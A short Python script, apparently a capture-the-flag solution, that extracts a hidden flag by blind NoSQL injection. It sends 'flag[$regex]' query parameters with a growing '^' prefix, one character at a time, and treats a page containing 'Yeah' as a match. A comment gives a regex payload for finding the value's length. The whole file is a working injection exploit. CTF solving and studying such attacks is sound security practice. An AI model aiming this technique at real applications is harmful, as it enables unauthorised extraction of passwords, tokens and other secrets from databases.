import requests
import urllib3
import string
import urllib

urllib3.disable_warnings()

url = ""

username = "username"
flag = ""

'''
find lengh:
flag[$regex]=.{21}
'''
i = 1

while True:
	for c in string.printable:
		if c not in ['*','+','.','?','|']:
			payload = {'username':username,'flag[$regex]':'^'+flag+c}
			r = requests.get(url,params=payload)
			if 'Yeah' in r.text:
				i += 1
				flag += c
				print flag
				if i == 22:
					exit()
				break

